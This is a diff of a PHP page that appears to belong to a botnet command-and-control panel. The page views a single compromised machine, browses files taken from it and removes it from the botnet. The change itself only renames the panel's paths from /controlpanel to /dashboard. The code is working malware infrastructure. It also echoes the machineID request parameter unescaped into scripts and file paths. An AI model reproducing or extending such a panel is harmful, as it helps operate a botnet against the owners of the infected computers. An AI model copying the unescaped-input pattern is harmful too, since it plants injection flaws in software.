@@ -1,6 +1,6 @@
 <?php
 if (!isset($_GET['machineID']) || (isset($_GET['machineID']) && $_GET['machineID'] == "")) {
-	echo "<script>window.location.replace(\"/controlpanel/?section=botnet\");</script>";
+	echo "<script>window.location.replace(\"/dashboard/?section=botnet\");</script>";
 }
 ?>
 <style>
@@ -255,7 +255,7 @@ if (!isset($_GET['machineID']) || (isset($_GET['machineID']) && $_GET['machineID
 		<h4>Files</h4>
 		<?php
 		/*
-		echo '<a href="/controlpanel/?section=fileManager&machineID='.$_GET['machineID'].'"/>Files Index</a><hr /> ';
+		echo '<a href="/dashboard/?section=fileManager&machineID='.$_GET['machineID'].'"/>Files Index</a><hr /> ';
 		$dirname = "../machines/".$_GET['machineID']."/files/";
 		$images = scandir($dirname);
 		$ignore = array(".", "..");
@@ -412,16 +412,16 @@ if (!isset($_GET['machineID']) || (isset($_GET['machineID']) && $_GET['machineID
 					xhttp.open("POST", "operations.php", true);
 					xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 					xhttp.send("operation=removeMachine&id=" + machineID);
-					window.location.replace("/controlpanel/?section=botnet");
+					window.location.replace("/dashboard/?section=botnet");
 				}
 			}
 
 			function goToFileManager() {
-				window.location.href = "/controlpanel/?section=fileManager&machineID=<?php echo $_GET["machineID"]; ?>";
+				window.location.href = "/dashboard/?section=fileManager&machineID=<?php echo $_GET["machineID"]; ?>";
 			}
 
 			function goToMachineManager() {
-				var win = window.open("/controlpanel/fileManager/fileManager.php?machineID=<?php echo $_GET["machineID"]; ?>", '_blank');
+				var win = window.open("/dashboard/fileManager/fileManager.php?machineID=<?php echo $_GET["machineID"]; ?>", '_blank');
 				win.focus();
 			}
 
